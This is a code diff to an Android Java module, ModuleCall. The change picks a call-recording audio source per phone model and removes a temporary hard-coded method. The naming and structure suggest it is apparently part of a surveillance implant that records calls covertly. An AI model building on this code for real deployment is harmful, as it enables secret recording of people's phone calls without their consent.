@@ -44,7 +44,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean record;
 	private String currentRecordFile;
 	private DateTime from;
-	private String number;
+	private String number, model;
+	private int strategy = 0;
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
@@ -138,8 +139,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
 			}
 
-			int strategy = getStrategy();
-
 			if (strategy == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): no valid strategy found"); //$NON-NLS-1$
@@ -215,7 +214,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			
 			file.delete();
 		}
-
 	}
 
 	private int checkIntegrity(byte[] data) {
@@ -319,21 +317,33 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private boolean isSupported() {
-		String model = Build.MODEL.toLowerCase();
+		model = Build.MODEL.toLowerCase();
 		boolean supported = false;
 
 		if (model.contains("i9100")) {
 			supported = true;
-
+			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
+			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): model supported by call registration module"); //$NON-NLS-1$
+				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
+			}
+		} else if (model.contains("galaxy nexus")){
+			supported = true;
+			strategy = MediaRecorder.AudioSource.MIC;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
 			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
 			}
+			
+			// REMOVE
+			//strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 		}
 
+		// REMOVE
 		//supported = true;
 		return supported;
 	}
@@ -351,6 +361,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		recorder.setAudioSource(audioSource);
 		recorder.setOutputFormat(outputFormat);
+		// REMOVE
+		recorder.setAudioChannels(1);
+		
 		recorder.setAudioEncoder(audioEncoder);
 		recorder.setOutputFile(path);
 
@@ -384,13 +397,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return true;
 	}
 
-	// Must be called only when a call is in progress
-	@SuppressWarnings("unchecked")
-	private int getStrategy() {
-		// Return temporaneo per ISS, funziona solo con Samsung Galaxy S2
-		// TODO rimuovere e usare getStrategyNotYetWorking() qui sotto
-		return MediaRecorder.AudioSource.VOICE_UPLINK;
-	}
 
 	private int getStrategyNotYetWorking() {
 		Markup markupCallStrategy = new Markup(this);
